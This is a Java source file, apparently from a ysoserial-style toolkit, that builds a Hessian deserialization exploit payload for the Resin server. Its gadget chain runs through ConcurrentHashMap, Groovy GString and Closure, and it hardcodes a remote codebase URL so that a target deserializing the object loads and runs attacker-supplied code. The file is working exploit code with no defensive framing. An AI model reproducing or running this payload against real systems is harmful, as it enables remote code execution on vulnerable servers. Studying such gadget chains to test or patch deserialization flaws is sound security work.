package hessian.payloadGroups;

import com.caucho.naming.QName;
import gadgetFragment.Entry2HashFragment;
import gadgetFragment.InvokeChainedFragment;
import gadgetFragment.ToStringFragment;
import hessian.PayloadRunner;
import jdk.payloadGroups.ObjectPayload;
import jdk.payloadGroups.annotation.Authors;
import jdk.payloadGroups.annotation.Dependencies;
import org.codehaus.groovy.runtime.GStringImpl;
import org.codehaus.groovy.runtime.MethodClosure;
import util.Reflections;

import javax.naming.Context;

/* Gadget Chain: E.g.
java.util.concurrent.ConcurrentHashMap: void readObject
    groovy.lang.GString: int hashCode
    groovy.lang.GString: java.lang.String toString
    groovy.lang.GString: java.io.Writer writeTo
    groovy.lang.Closure: java.lang.Object call
    */

public class Resin extends PayloadRunner implements ObjectPayload<Object> {

	public Object getObject(String command) throws Exception {
        command = "http://127.0.0.1:8081/";
        Object evilObj = InvokeChainedFragment.getCCT(command);
        QName qName = new QName((Context) evilObj, "fo", "bar");
        return ToStringFragment.getXStringForFSB(qName,7);
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Resin.class, args);
	}
}
